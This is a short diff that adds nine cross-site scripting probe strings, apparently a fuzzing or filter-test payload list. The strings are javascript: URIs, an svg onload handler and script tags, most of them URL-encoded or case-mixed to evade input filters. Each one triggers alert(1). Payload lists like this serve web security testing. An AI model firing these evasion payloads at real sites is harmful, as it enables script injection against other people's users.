@@ -1,0 +1,9 @@
+%6aava%73%63%72%69%70t:al%65rt%281%29
+%6aa%76asc%72%69pt:%61lert(1)
+java%73c%72ipt:a%6cert%28%31)
+<svg/onload=alert(1)>
+ja%76%61%73%63rip%74%3a%61le%72%74%281)
+<sCrIpT>alert(1)</sCrIpT>
+javascript:alert(1)
+<s%43%72I%70%54>%61%6ce%72%74%281)%3c/%73C%72%49pT%3e
+<%73C%72%49pT>%61%6c%65rt%281)%3c%2f%73CrI%70%54%3e
